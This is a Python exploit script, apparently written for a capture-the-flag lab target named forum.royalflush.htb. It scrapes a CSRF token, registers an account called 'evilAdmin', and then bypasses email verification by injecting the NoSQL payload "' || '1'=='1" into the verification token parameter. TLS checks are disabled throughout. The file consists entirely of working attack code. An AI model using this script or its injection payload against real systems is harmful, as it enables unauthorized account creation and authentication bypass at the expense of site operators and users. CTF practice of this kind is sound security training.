#!/usr/bin/env python3
import requests
import urllib3
import sys
import re

urllib3.disable_warnings()

TARGET = "https://forum.royalflush.htb"
username = "evilAdmin"
email = "evilAdmin@royalflush.htb"
password = "Password123!"

s = requests.Session()

# Get CSRF token
print("Getting CSRF token")
r = s.get(f"{TARGET}/create-account", verify=False)
token_match = re.search(r'name="_token" value="([^"]+)"', r.text)
if not token_match:
    print("Failed to fetch CSRF token")
    sys.exit(1)
csrf_token = token_match.group(1)

# Register account
print("Creating account")
r = s.post(f"{TARGET}/create-account", data={
    'username': username,
    'email': email,
    'password': password,
    'repeatPassword': password,
    '_token': csrf_token
}, verify=False)

if 'Created account successfully' in r.text:
    print("Success")
else:
    print("Failed to create account")
    sys.exit(1)

# Bypass verification with NoSQL injection
print("Bypassing email verification")
payload = "' || '1'=='1"
r = s.get(f"{TARGET}/verify-email", params={
    'email': email,
    'token': payload
}, verify=False)

if 'successfully verified' in r.text:
    print("Verification bypassed. You can now log in to the forum as evilAdmin : Password123!")
else:
    print("Bypass failed")
    sys.exit(1)